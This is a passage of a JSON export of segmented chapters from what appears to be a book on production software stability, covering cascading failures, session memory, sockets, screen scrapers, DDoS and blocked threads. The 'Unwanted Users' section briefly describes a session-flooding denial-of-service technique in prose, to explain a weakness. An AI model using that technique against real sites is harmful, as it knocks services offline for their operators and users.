      "content": "Cascading Failures • 49\n\nHunt for resource leaks.\n\nMost of the time, a chain reaction happens when your application has a memory leak. As one server runs out of memory and goes down, the other servers pick up the dead one’s burden. The increased traffic means they leak memory faster.\n\nHunt for obscure timing bugs.\n\nObscure race conditions can also be triggered by traffic. Again, if one server goes down to a deadlock, the increased load on the others makes them more likely to hit the deadlock too.\n\nUse Autoscaling.\n\nIn the cloud, you should create health checks for every autoscaling group. The scaler will shut down instances that fail their health checks and start new ones. As long as the scaler can react faster than the chain reaction propagates, your service will be available.\n\nDefend with Bulkheads.\n\nPartitioning servers with Bulkheads, on page 98, can prevent chain reactions from taking out the entire service—though they won’t help the callers of whichever partition does go down. Use Circuit Breaker on the calling side for that.\n\nCascading Failures\n\nSystem failures start with a crack. That crack comes from some fundamental problem. Maybe there’s a latent bug that some environmental factor triggers. Or there could be a memory leak, or some component just gets overloaded. Things to slow or stop the crack are the topics of the next chapter. Absent those mechanisms, the crack can progress and even be amplified by some structural problems. A cascading failure occurs when a crack in one layer triggers a crack in a calling layer.\n\nAn obvious example is a database failure. If an entire database cluster goes dark, then any application that calls the database is going to experience prob- lems of some kind. What happens next depends on how the caller is written. If the caller handles it badly, then the caller will also start to fail, resulting in a cascading failure. (Just like we draw trees upside-down with their roots pointing to the sky, our problems cascade upward through the layers.)\n\nPretty much every enterprise or web system looks like a set of services grouped into distinct farms or clusters, arranged in layers. Outbound calls from one service funnel through a load balancer to reach the provider. Time was, we talked about “three-tier” systems: web server, app server, and database server.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 50\n\nSometimes search servers were off to the side. Now, we’ve got dozens or hun- dreds of interlinked services, each with their own database. Each service is like its own little stack of layers, which are then connected into layers of dependen- cies beyond that. Every dependency is a chance for a failure to cascade.\n\nCrucial services with a high fan-in—meaning ones with many callers—spread their problems widely, so they are worth extra scrutiny.\n\nCascading failures require some mechanism to transmit the failure from one layer to another. The failure “jumps the gap” when bad behavior in the calling layer gets triggered by the failure condition in the provider.\n\nCascading failures often result from resource pools that get drained because of a failure in a lower layer. Integration points without timeouts are a surefire way to create cascading failures.\n\nThe layer-jumping mechanism often takes the form of blocked threads, but I’ve also seen the reverse—an overly aggressive thread. In one case, the calling layer would get a quick error, but because of a historical precedent it would assume that the error was just an irreproducible, transient error in the lower layer. At some point, the lower layer was suffering from a race condition that would make it kick out an error once in a while for no good reason. The upstream developer decided to retry the call when that happened. Unfortu- nately, the lower layer didn’t provide enough detail to distinguish between the transient error and a more serious one. As a result, once the lower layer started to have some real problems (losing packets from the database because of a failed switch), the caller started to pound it more and more. The more the lower layer whined and cried, the more the upper layer yelled, “I’ll give you something to cry about!” and hammered it even harder. Ultimately, the calling layer was using 100 percent of its CPU making calls to the lower layer and logging failures in calls to the lower layer. A Circuit Breaker, on page 95, would really have helped here.\n\nSpeculative retries also allow failures to jump the gap. A slowdown in the provider will cause the caller to fire more speculative retry requests, tying up even more threads in the caller at a time when the provider is already responding slowly.\n\nJust as integration points are the number-one source of cracks, cascading failures are the number-one crack accelerator. Preventing cascading failures is the very key to resilience. The most effective patterns to combat cascading failures are Circuit Breaker and Timeouts.\n\nreport erratum • discuss\n\nUsers • 51\n\nRemember This\n\nStop cracks from jumping the gap.\n\nA cascading failure occurs when cracks jump from one system or layer to another, usually because of insufficiently paranoid integration points. A cascading failure can also happen after a chain reaction in a lower layer. Your system surely calls out to other enterprise systems; make sure you can stay up when they go down.\n\nScrutinize resource pools.\n\nA cascading failure often results from a resource pool, such as a connec- tion pool, that gets exhausted when none of its calls return. The threads that get the connections block forever; all other threads get blocked waiting for connections. Safe resource pools always limit the time a thread can wait to check out a resource.\n\nDefend with Timeouts and Circuit Breaker.\n\nA cascading failure happens after something else has already gone wrong. Circuit Breaker protects your system by avoiding calls out to the troubled integration point. Using Timeouts ensures that you can come back from a call out to the troubled point.\n\nUsers\n\nUsers are a terrible thing. Systems would be much better off with no users.\n\nObviously, I’m being somewhat tongue-in-cheek. Although users do present numerous risks to stability, they’re also the reason our systems exist. Yet the human users of a system have a knack for creative destruction. When your system is teetering on the brink of disaster like a car on a cliff in a movie, some user will be the seagull that lands on the hood. Down she goes! Human users have a gift for doing exactly the worst possible thing at the worst possible time.\n\nWorse yet, other systems that call ours march remorselessly forward like an army of Terminators, utterly unsympathetic about how close we are to crashing.\n\nTraffic\n\nAs traffic grows, it will eventually surpass your capacity. (If traffic isn’t growing, then you have other problems to worry about!) Then comes the biggest question: how does your system react to excessive demand?\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 52\n\n“Capacity” is the maximum throughput your system can sustain under a given workload while maintaining acceptable performance. When a transaction takes too long to execute, it means that the demand on your system exceeds its capacity. Internal to your system, however, are some harder limits. Passing those limits creates cracks in the system, and cracks always propagate faster under stress.\n\nIf you are running in the cloud, then autoscaling is your friend. But beware! It’s not hard to run up a huge bill by autoscaling buggy applications.\n\nHeap Memory\n\nOne such hard limit is memory available, particularly in interpreted or man- aged code languages. Take a look at the following figure. Excess traffic can stress the memory system in several ways. First and foremost, in web app back ends, every user has a session. Assuming you use memory-based ses- sions (see Off-Heap Memory, Off-Host Memory, on page 54, for an alternative to in-memory sessions), the session stays resident in memory for a certain length of time after the last request from that user. Every additional user means more memory.\n\nFirstRequest\n\nLastRequest\n\nSessionTimeout\n\nDead Time\n\nSession Active\n\nDuring that dead time, the session still occupies valuable memory. Every object you put into the session sits there in memory, tying up precious bytes that could be serving some other user.\n\nWhen memory gets short, a large number of surprising things can happen. Probably the least offensive is throwing an out-of-memory exception at the user. If things are really bad, the logging system might not even be able to log the error. If no memory is available to create the log event, then nothing gets logged. (This, by the way, is a great argument for external monitoring in addition to log file scraping.) A supposedly recoverable low-memory situation will rapidly turn into a serious stability problem.\n\nYour best bet is to keep as little in the in-memory session as possible. For example, it’s a bad idea to keep an entire set of search results in the session\n\nreport erratum • discuss\n\nfor pagination. It’s better if you requery the search engine for each new page of results. For every bit of data you put in the session, consider that it might never be used again. It could spend the next thirty minutes uselessly taking up memory and putting your system at risk.\n\nIt would be wonderful if there was a way to keep things in the session (therefore in memory) when memory is plentiful but automatically be more frugal when memory is tight. Good news! Most language runtimes let you do exactly that with weak references.2 They’re called different things in different libraries, so look for System.WeakReference in C#, java.lang.ref.SoftReference in Java, weakref in Python, and so on. The basic idea is that a weak reference holds another object, called the payload, but only until the garbage collector needs to reclaim memory. When only soft references to the object are left (as shown in the following figure), it can be collected.\n\nExpensiveObject\n\nSoftReference\n\npayload\n\nYou construct a weak reference with the large or expensive object as the payload. The weak reference object actually is a bag of holding. It keeps the payload for later use.\n\nMagicBean hugeExpensiveResult = ...; SoftReference ref = new SoftReference(hugeExpensiveResult);\n\nsession.setAttribute(EXPENSIVE_BEAN_HOLDER, ref);\n\nThis is not a transparent change. Accessors must be aware of the indirection. Think about using a third-party or open source caching library that uses weak references to reclaim memory.\n\nWhat is the point of adding this level of indirection? When memory gets low, the garbage collector is allowed to reclaim any weakly reachable objects. In other words, if there are no hard references to the object, then the payload can be collected. The actual decision about when to reclaim softly reachable objects, how many of them to reclaim, and how many to spare is totally up to the garbage collector. You have to read your runtime’s docs very carefully, but usually the only guarantee is that weakly reachable objects will be reclaimed before an out-of-memory error occurs.\n\n2.\n\nhttps://en.wikipedia.org/wiki/Weak_reference\n\nUsers • 53\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 54\n\nIn other words, the garbage collector will take advantage of all the help you give it before it gives up. Be careful to note that it is the payload object that gets garbage-collected, not the weak reference itself. Since the garbage col- lector is allowed to harvest the payload at any time, callers must also be written to behave nicely when the payload is gone. Code that uses the payload object must be prepared to deal with a null. It can choose to recompute the expensive result, redirect the user to some other activity, or take any other protective action.\n\nWeak references are a useful way to respond to changing memory conditions, but they do add complexity. When you can, it’s best to just keep things out of the session.\n\nOff-Heap Memory, Off-Host Memory\n\nAnother effective way to deal with per-user memory is to farm it out to a dif- ferent process. Instead of keeping it inside the heap—that is, inside the address space of your server’s process—move it out to some other process. Memcached is a great tool for this.3 It’s essentially an in-memory key-value store that you can put on a different machine or spread across several machines.\n\nRedis is another popular tool for moving memory out of your process.4 It’s a fast “data structure server” that lives in a space between cache and database. Many systems use Redis to hold session data instead of keeping it in memory or in a relational database.\n\nAny of these approaches exercise a trade-off between total addressable memory size and latency to access it. This notion of memory hierarchy is ranked by size and distance. Registers are fastest and closest to the CPU, followed by cache, local memory, disk, tape, and so on. On one hand, networks have gotten fast enough that “someone else’s memory” can be faster to access than local disk. Your application is better off making a remote call to get a value than reading it from storage. On the other hand, local memory is still faster than remote memory. There’s no one-size-fits-all answer.\n\nSockets\n\nYou may not spend much time thinking about the number of sockets on your server, but that’s another limit you can run into when traffic gets heavy. Every active request corresponds to an open socket. The operating system assigns inbound connections to an “ephemeral” port that represents the receiving\n\n3. 4.\n\nwww.memcached.org\n\nwww.redis.io\n\nreport erratum • discuss\n\nside of the connection. If you look at the TCP packet format, you’ll see that a port number is 16 bits long. It can only go up to 65535. Different OSs use different port ranges for ephemeral sockets, but the IANA recommended range is 49152 to 65535. That gives your server the ability to have at most 16,383 connections open. But your machine is probably dedicated to your service rather than handling, say, user logins. So we can stretch that range to ports 1024–65535, for a maximum of 64,511 connections.\n\nNow I’ll tell you that some servers are handling more than a million concurrent connections. Some people are pushing toward ten million connections on a single machine.\n\nIf there are only 64,511 ports available for connections, how can a server have a million connections? The secret is virtual IP addresses. The operating system binds additional IP addresses to the same network interface. Each IP address has its own range of port numbers, so we would need a total of 16 IP addresses to handle that many connections.\n\nThis is not a trivial thing to tackle. Your application will probably need some changes to listen on multiple IP addresses and handle connections across them all without starving any of the listen queues. A million connections also need a lot of kernel buffers. Plan to spend some time learning about your operating system’s TCP tuning parameters.\n\nClosed Sockets\n\nNot only can open sockets be a problem, but the ones you’ve already closed can bite you too. After your application code closes a socket, the TCP stack moves it through a couple of terminal states. One of them is the TIME_WAIT state. TIME_WAIT is a delay period before the socket can be reused for a new connection. It’s there as part of TCP’s defense against bogons.\n\nNo, really. Bogons. I’m not making this up.\n\nA bogon is a wandering packet that got routed inefficiently and arrives late, possibly out of sequence, and after the connection is closed. If the socket were reused too quickly, then a bogon could arrive with the exact right com- bination of IP address, destination port number, and TCP sequence number to be accepted as legitimate data for the new connection. In essence a bit of data from the old connection would show up midstream in the new one.\n\nBogons are a real, though minor, problem on the Internet at large. Within your data center or cloud infrastructure, though, they are less likely to be an issue. You can turn the TIME_WAIT interval down to get those ports back into use ASAP.\n\nUsers • 55\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 56\n\nExpensive to Serve\n\nSome users are way more demanding than others. Ironically, these are usu- ally the ones you want more of. For example, in a retail system, users who browse a couple of pages, maybe do a search, and then go away are both the bulk of users and the easiest to serve. Their content can usually be cached (however, see Use Caching, Carefully, on page 67, for important cautions about caching). Serving their pages usually does not involve external integra- tion points. You will likely do some personalization, maybe some clickstream tracking, and that’s about it.\n\nBut then there’s that user who actually wants to buy something. Unless you’ve licensed the one-click checkout patent, checkout probably takes four or five pages. That’s already as many pages as a typical user’s entire session. On top of that, checking out can involve several of those troublesome inte- gration points: credit card authorization, sales tax calculation, address standardization, inventory lookups, and shipping. In fact, more buyers don’t just increase the stability risk for the front-end system, they can place back- end or downstream systems at risk too. (See Unbalanced Capacities, on page 75.) Increasing the conversion rate might be good for the profit-and-loss statement, but it’s definitely hard on the systems.\n\nThere is no effective defense against expensive users. They are not a direct stability risk, but the increased stress they produce increases the likelihood of triggering cracks elsewhere in the system. Still, I don’t recommend measures to keep them off the system, since they are usually the ones who generate revenue. So, what should you do?\n\nThe best thing you can do about expensive users is test aggressively. Identify whatever your most expensive transactions are and double or triple the pro- portion of those transactions. If your retail system expects a 2 percent conver- sion rate (which is about standard for retailers), then your load tests should test for a 4, 6, or 10 percent conversion rate.\n\nIf a little is good, then a lot must be better, right? In other words, why not test for a 100 percent conversion rate? As a stability test, that’s not a bad idea. I wouldn’t use the results to plan capacity for regular production traffic, though. By definition, these are the most expensive transactions. Therefore, the average stress on the system is guaranteed to be less than what this test produces. Build the system to handle nothing but the most expensive trans- actions and you will spend ten times too much on hardware.\n\nreport erratum • discuss",
      "page_number": 59,
      "chapter_number": 8,
      "summary": "This chapter covers segment 8 (pages 59-66). Key topics include memory, server, and layer.",
      "keywords": [
        "Server",
        "memory",
        "chain reaction",
        "cascading failures",
        "layer",
        "failure",
        "Cluster Manager Server",
        "system",
        "lower layer",
        "Load Balancer",
        "Load",
        "Chain",
        "cascading",
        "Clients Server",
        "chain reaction failure"
      ],
      "concepts": [
        "memory",
        "server",
        "layer",
        "failure",
        "session",
        "sessions",
        "gets",
        "cascading",
        "cascade",
        "users"
      ],
      "similar_chapters": [
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.65,
          "method": "sentence_transformers"
        },
        {
          "book": "Generative AI with LangChain_2e",
          "chapter": 15,
          "title": "Segment 15 (pages 122-129)",
          "relevance_score": 0.65,
          "method": "sentence_transformers"
        },
        {
          "book": "A Philosophy of Software Design",
          "chapter": 24,
          "title": "Segment 24 (pages 201-208)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Computer Systems A Programmer’s Perspective",
          "chapter": 33,
          "title": "Segment 33 (pages 662-682)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "C++ Concurrency in Action",
          "chapter": 2,
          "title": "Segment 2 (pages 9-16)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 9,
      "title": "Segment 9 (pages 67-74)",
      "start_page": 67,
      "end_page": 74,
      "detection_method": "topic_boundary",
      "content": "Unwanted Users\n\nWe would all sleep easier if the only users to worry about were the ones handing us their credit card numbers. In keeping with the general theme of “weird, bad things happen in the real world,” weird, bad users are definitely out there.\n\nSome of them don’t mean to be bad. For example, I’ve seen badly configured proxy servers start requesting a user’s last URL over and over again. I was able to identify the user’s session by its cookie and then trace the session back to the registered customer. Logs showed that the user was legitimate. For some reason, fifteen minutes after the user’s last request, the request started reappearing in the logs. At first, these requests were coming in every thirty seconds. They kept accelerating, though. Ten minutes later, we were getting four or five requests every second. These requests had the user’s identifying cookie but not his session cookie. So each request was creating a new session. It strongly resembled a DDoS attack, except that it came from one particular proxy server in one location.\n\nOnce again, we see that sessions are the Achilles’ heel of web applications. Want to bring down nearly any dynamic web application? Pick a deep link from the site and start requesting it without sending cookies. Don’t even wait for the response; just drop the socket connection as soon as you’ve sent the request. Web servers never tell the application servers that the end user stopped listening for an answer. The application server just keeps on process- ing the request. It sends the response back to the web server, which funnels it into the bit bucket. In the meantime, the 100 bytes of the HTTP request cause the application server to create a session (which may consume several kilobytes of memory in the application server). Even a desktop machine on a broadband connection can generate hundreds of thousands of sessions on the application servers.\n\nIn extreme cases, such as the flood of sessions originating from the single location, you can run into problems worse than just heavy memory consump- tion. In our case, the business users wanted to know how often their most loyal customers came back. The developers wrote a little interceptor that would update the “last login” time whenever a user’s profile got loaded into memory from the database. During these session floods, though, the request presented a user ID cookie but no session cookie. That meant each request was treated like a new login, loading the profile from the database and attempting to update the “last login” time.\n\nUsers • 57\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 58\n\nSession Tracking\n\nHTTP is a singularly unlikely protocol. If you were tasked with creating a protocol to facilitate arts, sciences, commerce, free speech, words, pictures, sound, and video, one that could weave the vastness of human knowledge and creativity into a single web, it is unlikely that you would arrive at HTTP. HTTP is stateless, for one thing. To the server, each new requester emerges from the swirling fog and makes some demand like “GET /site/index.jsp.” Once answered, they disappear back into the fog without so much as a thank you. Should one of these rude, demanding clients reappear, the server, in perfectly egalitarian ignorance, doesn’t recognize that it has seen them before.\n\nSome clever folks at Netscape found a way to graft an extra bit of data into the protocol. Netscape originally conceived this data, called cookies (for no compelling reason), as a way to pass state back and forth from client to server and vice versa. Cookies are a clever hack. They allowed all kinds of new applications, such as personalized portals (a big deal back then) and shopping sites. Security-minded application developers quickly realized, however, that unencrypted cookie data was open to manipulation by hostile clients. So, security dictates that the cookie either cannot contain actual data or must be encrypted. At the same time, high-volume sites found that passing real state in cookies uses up lots of expensive bandwidth and CPU time. Encrypting the cookies was right out.\n\nSo cookies started being used for smaller pieces of data, just enough to tag a user with a persistent cookie or a temporary cookie to identify a session.\n\nA session is an abstraction that makes building applications easier. All the user really sends are a series of HTTP requests. The web server receives these and, through a series of machinations, returns an HTTP response. There is no “begin a session” request by which the web browser can indicate it is about to start sending requests, and there is no “session finished” request. (The web server could not trust that such an indicator would be sent anyway.)\n\nSessions are all about caching data in memory. Early CGI applications had no need for a session, since they would fire up a new process (usually a Perl script) for each new request. That worked fine. There’s nothing quite as safe as the “fork, run, and die” model. To reach higher volumes, however, developers and vendors turned to long-running application servers, such as Java application servers and long-running Perl processes via mod_perl. Instead of waiting for a process fork on each request, the server is always running, waiting for requests. With the long-running server, you can cache state from one request to another, reducing the number of hits to the database. Then you need some way to identify a request as part of a session. Cookies work well for this.\n\nApplication servers handle all the cookie machinery for you, presenting a nice program- matic interface with some resemblance to a Map or Dictionary. As usual, though, the trouble with invisible machinery is that it can go horribly wrong when misused. When that invisible machinery involves layers of kludges meant to make HTTP look like a real application protocol, it can tip over badly. For example, home-brew shopping bots do not handle session cookies properly. Each request creates a new session, consuming memory for no good reason. If the web server is configured to ask the application server for every URL, not just ones within a mapped context, then sessions can get created by requests for nonexistent pages.\n\nreport erratum • discuss\n\nImagine 100,000 transactions all trying to update the same row of the same table in the same database. Somebody is bound to get deadlocked. Once a single transaction with a lock on the user’s profile gets hung (because of the need for a connection from a different resource pool), all the other database transactions on that row get blocked. Pretty soon, every single request-handling thread gets used up with these bogus logins. As soon as that happens, the site is down.\n\nSo one group of bad users just blunder around leaving disaster in their wake. More crafty sorts, however, deliberately do abnormal things that just happen to have undesirable effects. The first group isn’t deliberately malicious; they do damage inadvertently. This next group belongs in its own category.\n\nAn entire parasitic industry exists by consuming resources from other com- panies’ websites. Collectively known as competitive intelligence companies, these outfits leech data out of your system one web page at a time.\n\nThese companies will argue that their service is no different from a grocery store sending someone into a competing store with a list and a clipboard. There is a big difference, though. Given the rate that they can request pages, it’s more like sending a battalion of people into the store with clipboards. They would crowd out the aisles so legitimate shoppers could not get in.\n\nWorse yet, these rapid-fire screen scrapers do not honor session cookies, so if you are not using URL rewriting to track sessions, each new page request will create a new session. Like a flash mob, pretty soon the capacity problem will turn into a stability problem. The battalion of price checkers could actu- ally knock down the store.\n\nKeeping out legitimate robots is fairly easy through the use of the robots.txt file.5 The robot has to ask for the file and choose to respect your wishes. It’s a social convention—not even a standard—and definitely not enforceable. Some sites also choose to redirect robots and spiders, based on the user-agent header. In the best cases, these agents get redirected to a static copy of the product catalog, or the site generates pages without prices. (The idea is to be searchable by the big search engines but not reveal pricing. That way, you can personalize the prices, run trial offers, partition the country or the audience to conduct market tests, and so on.) In the worst case, the site sends the agent into a dead end.\n\nSo the robots most likely to respect robots.txt are the ones that might actually generate traffic (and revenue) for you, while the leeches ignore it completely.\n\nI’ve seen only two approaches work.\n\n5.\n\nwww.w3.org/TR/html4/appendix/notes.html#h-B.4.1.1\n\nUsers • 59\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 60\n\nThe first is technical. Once you identify a screen scraper, block it from your network. If you’re using a content distribution network such as Akamai, it can provide this service for you. Otherwise, you can do it at the outer firewalls. Some of the leeches are honest. Their requests come from legitimate IP addresses with real reverse DNS entries. ARIN is your friend here.6 Blocking the honest ones is easy. Others stealthily mask their source addresses or make requests from dozens of different addresses. Some of these even go so far as to change their user-agent strings around from one request to the next. (When a single IP address claims to be running Internet Explorer on Windows, Opera on Mac, and Firefox on Linux in the same five-minute window, some- thing is up. Sure, it could be an ISP-level supersquid or somebody running a whole bunch of virtual emulators. When these requests are sequentially spidering an entire product category, it’s more likely to be a screen scraper.) You may end up blocking quite a few subnets, so it’s a good idea to periodi- cally expire old blocks to keep your firewalls performing well. This is a form of Circuit Breaker.\n\nThe second approach is legal. Write some terms of use for your site that say users can view content only for personal or noncommercial purposes. Then, when the screen scrapers start hitting your site, sic the lawyers on them. (Obviously, this requires enough legal firepower to threaten them effectively.) Neither of these is a permanent solution. Consider it pest control—once you stop, the infestation will resume.\n\nMalicious Users\n\nThe final group of undesirable users are the truly malicious. These bottom- feeding mouth breathers just live to kill your baby. Nothing excites them more than destroying the very thing you’ve put blood, sweat, and tears into building. These were the kids who always got their sand castles kicked over when they were little. That deep-seated bitterness compels them to do the same thing to others that was done to them.\n\nTruly talented crackers who can analyze your defenses, develop a customized attack, and infiltrate your systems without being spotted are blessedly rare. This is the so-called “advanced persistent threat.” Once you are targeted by such an entity, you will almost certainly be breached. Consult a serious reference on security for help with this. I cannot offer you sound advice beyond that. This gets into deep waters with respect to law enforcement and forensic evidence.\n\n6.\n\nwww.arin.net\n\nreport erratum • discuss\n\nThe overwhelming majority of malicious users are known as “script kiddies.” Don’t let the diminutive name fool you. Script kiddies are dangerous because of their sheer numbers. Although the odds are low that you will be targeted by a true cracker, your systems are probably being probed by script kiddies right now.\n\nThis book is not about information security or online warfare. A robust approach to defense and deterrence is beyond my scope. I will restrict my discussion to the intersection of security and stability as it pertains to system and software architecture. The primary risk to stability is the now-classic distributed denial-of-service (DDoS) attack. The attacker causes many com- puters, widely distributed across the Net, to start generating load on your site. The load typically comes from a botnet. Botnet hosts are usually compro- mised Windows PCs, but with the Internet of Things taking off, we can expect to see that population diversify to include thermostats and refrigerators. A daemon on the compromised computer polls some control channel like IRC or even customized DNS queries, through which the botnet master issues com- mands. Botnets are now big business in the dark Net, with pay-as-you-go service as sophisticated as any cloud.\n\nNearly all attacks vector in against the applications rather than the network gear. These force you to saturate your own outbound bandwidth, denying service to legitimate users and racking up huge bandwidth charges.\n\nAs you have seen before, session management is the most vulnerable point of a server-side web application. Application servers are particularly fragile when hit with a DDoS, so saturating the bandwidth might not even be the worst issue you have to deal with. A specialized Circuit Breaker can help to limit the damage done by any particular host. This also helps protect you from the accidental traffic floods, too.\n\nNetwork vendors all have products that detect and mitigate DDoS attacks. Proper configuring and monitoring of these products is essential. It’s best to run these in “learning” or “baseline” mode for at least a month to understand what your normal, cyclic traffic patterns are.\n\nRemember This\n\nUsers consume memory.\n\nEach user’s session requires some memory. Minimize that memory to improve your capacity. Use a session only for caching so you can purge the session’s contents if memory gets tight.\n\nUsers • 61\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 62\n\nUsers do weird, random things.\n\nUsers in the real world do things that you won’t predict (or sometimes understand). If there’s a weak spot in your application, they’ll find it through sheer numbers. Test scripts are useful for functional testing but too predictable for stability testing. Look into fuzzing toolkits, property- based testing, or simulation testing.\n\nMalicious users are out there.\n\nBecome intimate with your network design; it should help avert attacks. Make sure your systems are easy to patch—you’ll be doing a lot of it. Keep your frameworks up-to-date, and keep yourself educated.\n\nUsers will gang up on you.\n\nSometimes they come in really, really big mobs. When Taylor Swift tweets about your site, she’s basically pointing a sword at your servers and crying, “Release the legions!” Large mobs can trigger hangs, deadlocks, and obscure race conditions. Run special stress tests to hammer deep links or hot URLs.\n\nBlocked Threads\n\nManaged runtime languages such as C#, Java, and Ruby almost never really crash. Sure, they get application errors, but it’s relatively rare to see the kind of core dump that a C or C++ program would have. I still remember when a rogue pointer in C could reduce the whole machine to a navel-gazing heap. (Anyone else remember Amiga’s “Guru Meditation” errors?) Here’s the catch about interpreted languages, though. The interpreter can be running, and the application can still be totally deadlocked, doing nothing useful.\n\nAs often happens, adding complexity to solve one problem creates the risk of entirely new failure modes. Multithreading makes application servers scalable enough to handle the web’s largest sites, but it also introduces the possibility of concurrency errors. The most common failure mode for applications built in these languages is navel-gazing—a happily running interpreter with every single thread sitting around waiting for Godot. Multithreading is complex enough that entire books are written about it. (For the Java programmers: the only book on Java you actually need, however, is Brian Goetz’s excellent Java Concurrency in Practice [Goe06].) Moving away from the “fork, run, and die” execution model brings you vastly higher capacity but only by introducing a new risk to stability.\n\nreport erratum • discuss\n\nBlocked Threads • 63\n\nThe majority of system failures I have dealt with do not involve outright crashes. The process runs and runs but does nothing because every thread available for processing transactions is blocked waiting on some impossible outcome.\n\nI’ve probably tried a hundred times to explain the distinction between saying “the system crashed” and “the system is hung.” I finally gave up when I realized that it’s a distinction only an engineer bothers with. It’s like a physicist trying to explain where the photon goes in the two-slit experiment from quantum mechanics. Only one observable variable really matters—whether the system is able to process transactions or not. The business sponsor would frame this question as, “Is it generating revenue?”\n\nFrom the users’ perspective, a system they can’t use might as well be a smoking crater in the earth. The simple fact that the server process is running doesn’t help the user get work done, books bought, flights found, and so on.\n\nThat’s why I advocate supplementing internal monitors (such as log file scraping, process monitoring, and port monitoring) with external monitoring. A mock client somewhere (not in the same data center) can run synthetic transactions on a regular basis. That client experiences the same view of the system that real users experience. If that client cannot process the synthetic transactions, then there is a problem, whether or not the server process is running.\n\nMetrics can reveal problems quickly too. Counters like “successful logins” or “failed credit cards” will show problems long before an alert goes off.\n\nBlocked threads can happen anytime you check resources out of a connection pool, deal with caches or object registries, or make calls to external systems. If the code is structured properly, a thread will occasionally block whenever two (or more) threads try to access the same critical section at the same time. This is normal. Assuming that the code was written by someone sufficiently skilled in multithreaded programming, then you can always guarantee that the threads will eventually unblock and continue. If this describes you, then you are in a highly skilled minority.\n\nThe problem has four parts:\n\nError conditions and exceptions create too many permutations to test\n\nexhaustively.\n\nUnexpected interactions can introduce problems in previously safe code.\n\nreport erratum • discuss\n\nChapter 4. Stability Antipatterns • 64\n\nTiming is crucial. The probability that the app will hang goes up with the\n\nnumber of concurrent requests.\n\nDevelopers never hit their application with 10,000 concurrent requests.\n\nTaken together, these conditions mean that it’s very, very hard to find hangs during development. You can’t rely on “testing them out of the system.” The best way to improve your chances is to carefully craft your code. Use a small set of primitives in known patterns. It’s best if you download a well-crafted, proven library.\n\nIncidentally, this is another reason why I oppose anyone rolling their own connection pool class. It’s always more difficult than you think to make a reliable, safe, high-performance connection pool. If you’ve ever tried writing unit tests to prove safe concurrency, you know how hard it is to achieve confidence in the pool. Once you start trying to expose metrics, as I discuss in Designing for Transparency, on page 164, rolling your own connection pool goes from a fun Computer Science 101 exercise to a tedious grind.\n\nIf you find yourself synchronizing methods on your domain objects, you should probably rethink the design. Find a way that each thread can get its own copy of the object in question. This is important for two reasons. First, if you are synchronizing the methods to ensure data integrity, then your application will break when it runs on more than one server. In-memory coherence doesn’t matter if there’s another server out there changing the data. Second, your application will scale better if request-handling threads never block each other.\n\nOne elegant way to avoid synchronization on domain objects is to make your domain objects immutable. Use them for querying and rendering. When the time comes to alter their state, do it by constructing and issuing a “command object.” This style is called “Command Query Responsibility Separation,” and it nicely avoids a large number of concurrency issues.\n\nSpot the Blocking\n\nCan you find the blocking call in the following code?\n\nString key = (String)request.getParameter(PARAM_ITEM_SKU); Availability avl = globalObjectCache.get(key);\n\nYou might suspect that globalObjectCache is a likely place to find some synchro- nization. You would be correct, but the point is that nothing in the calling code tells you that one of these calls is blocking and the other is not. In fact,\n\nreport erratum • discuss",
      "page_number": 67,
      "chapter_number": 9,
      "summary": "This chapter covers segment 9 (pages 67-74). Key topics include user, application, and applications.",
      "keywords": [
        "Users",
        "application servers",
        "session",
        "application",
        "request",
        "server",
        "requests",
        "web server",
        "system",
        "connections",
        "web",
        "cookie",
        "Java application servers",
        "Stability",
        "report erratum"
      ],
      "concepts": [
        "user",
        "application",
        "applications",
        "run",
        "running",
        "cookie",
        "request",
        "requests",
        "session",
        "sessions"
      ],
      "similar_chapters": [
        {
          "book": "A Philosophy of Software Design",
          "chapter": 10,
          "title": "Segment 10 (pages 77-87)",
          "relevance_score": 0.66,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 8",
          "chapter": 47,
          "title": "Segment 47 (pages 448-460)",
          "relevance_score": 0.65,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.63,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 10,
          "title": "Segment 10 (pages 80-87)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 11,
          "title": "Segment 11 (pages 92-103)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 10,
      "title": "Segment 10 (pages 75-82)",
      "start_page": 75,
      "end_page": 82,
      "detection_method": "topic_boundary",
      "content": "Blocked Threads • 65\n\nthe interface that globalObjectCache implemented didn’t say anything about synchronization either.\n\nIn Java, it’s possible for a subclass to declare a method synchronized that is unsynchronized in its superclass or interface definition. In C#, a subclass can annotate a method as synchronizing on “this.” Both of these are frowned on, but I’ve observed them in the wild. Object theorists will tell you that these examples violate the Liskov substitution principle. They are correct.\n\nIn object theory, the Liskov substitution principle (see Family Values: A Behavioral Notion of Subtyping [LW93]) states that any property that is true about objects of a type T should also be true for objects of any subtype of T. In other words, a method without side effects in a base class should also be free of side effects in derived classes. A method that throws the exception E in base classes should throw only exceptions of type E (or subtypes of E) in derived classes.\n\nJava and C# do not let you get away with other violations of the substitution principle, so I do not know why this one is allowed. Functional behavior composes, but concurrency does not compose. As a result, though, when subclasses add synchronization to methods, you cannot transparently replace an instance of the superclass with the synchronized subclass. This might seem like nit-picking, but it can be vitally important. The basic imple- mentation of the GlobalObjectCache interface is a relatively straightforward object registry:\n\npublic synchronized Object get(String id) {\n\nObject obj = items.get(id); if(obj == null) {\n\nobj = create(id); items.put(id, obj);\n\n}\n\nreturn 